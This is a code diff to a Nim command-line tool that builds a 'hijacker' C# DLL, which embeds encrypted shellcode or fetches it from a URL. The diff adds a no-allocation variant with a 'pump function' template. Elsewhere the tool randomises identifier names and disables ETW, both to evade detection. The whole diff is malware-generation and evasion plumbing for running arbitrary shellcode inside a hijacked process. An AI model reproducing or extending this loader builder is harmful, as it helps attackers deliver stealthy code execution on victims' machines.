@@ -6,7 +6,7 @@
         pr0b3r7
 ]#
 
-import std/[os, uri, strformat, osproc, strutils, tables]  # os: for file and directory operations
+import std/[os, uri, strformat, osproc, strutils, tables, macros]  # os: for file and directory operations
                                                            # uri: for URI handling
                                                            # strformat: for string formatting
                                                            # osproc: for executing OS processes
@@ -17,15 +17,26 @@ import mustache  # Importing the mustache library for templating
 import therapist # Importing the therapist library, used for command line parsing
 import ./crypto  # Importing a custom module named 'crypto' based on nimcrypto library for cryptographic operations
 
+macro `*` (a: string, i: int): string =
+    quote do:
+        var result: string
+        for _ in 0..<`i`:
+            result = result & `a`
+        result
+
 const CONFIG = slurp("../templates/config.mustache")
 const HIJACKER_EMBEDDED_PIC = slurp("../templates/hijacker-embedded-pic.mustache")  
 const HIJACKER_REMOTE_PIC = slurp("../templates/hijacker-remote-pic.mustache")
+const HIJACKER_NO_ALLOC_EMBEDDED_PIC = slurp("../templates/hijacker-no-alloc-embedded-pic.mustache")
+const PUMP_FUNC = slurp("../templates/pump-func.mustache")
 
 # Hashmap for embedded mustache templates
 let partials = {
   "config": CONFIG,
   "hijacker-embedded-pic": HIJACKER_EMBEDDED_PIC,
-  "hijacker-remote-pic": HIJACKER_REMOTE_PIC
+  "hijacker-remote-pic": HIJACKER_REMOTE_PIC,
+  "hijacker-no-alloc-embedded-pic": HIJACKER_NO_ALLOC_EMBEDDED_PIC,
+  "pump-func": PUMP_FUNC
 }.toTable()
 
 # The parser is specified as a tuple
@@ -34,6 +45,7 @@ let spec = (
     hijackName: newStringArg(@["-n", "--hijack-name"], required=true, help="Name of the hijacker .dll."),
     shellcodeUrl: newStringArg(@["-u", "--url"], help="URL of the remote shellcode to run."),
     shellcodeFile: newStringArg(@["-f", "--file"], help="File containing the shellcode to embed."),
+    noAlloc: newFlagArg(@["--no-alloc"], help="Disable memory allocation."),
     outputDirectory: newDirArg(@["-o", "--output"], required=true, help="Full directory to write files to."),
     disableEtw: newBoolArg(@["-e", "--etw"], defaultVal=true, help="Disable ETW."),
     version: newMessageArg(@["--version"], "1.0.0", help="Prints version."),
@@ -100,6 +112,7 @@ when isMainModule:
         var c = newContext()
         c.searchTable(partials)
 
+
         # Set variables in the context for template rendering.
         c["managerType"] = hijackName
         c["encShellcode"] = encShellcode
@@ -131,8 +144,15 @@ when isMainModule:
         c["var_codePtr"] = randName()
         c["class_StringEncryption"] = randName()
         c["class_NativeMethods"] = randName()
+        c["pump_func"] = randName()
 
-        fHijackCs.write("{{ >hijacker-embedded-pic }}".render(c))
+        if spec.noAlloc.seen:
+            # pump_func_body
+            c["pump_func_body"] = "{{ >pump-func }}".render(c) * 2
+            fHijackCs.write("{{ >hijacker-no-alloc-embedded-pic }}".render(c))
+        else:
+            fHijackCs.write("{{ >hijacker-embedded-pic }}".render(c))
+
         fHijackCs.close() # Close the hijack.cs file after writing.
 
         # Compile the C# source code into a DLL
